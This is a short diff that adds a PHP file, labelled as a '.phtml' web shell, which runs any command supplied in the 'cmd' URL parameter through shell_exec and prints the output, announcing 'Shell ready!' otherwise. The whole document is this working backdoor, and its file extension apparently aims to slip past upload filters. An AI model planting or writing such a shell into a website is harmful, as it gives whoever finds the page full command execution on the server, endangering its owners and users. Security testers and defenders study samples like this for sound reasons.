@@ -1,0 +1,8 @@
+<?php
+// Web Shell .phtml
+if(isset($_GET['cmd'])) {
+    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+} else {
+    echo "Shell ready! Use ?cmd=command";
+}
+?>
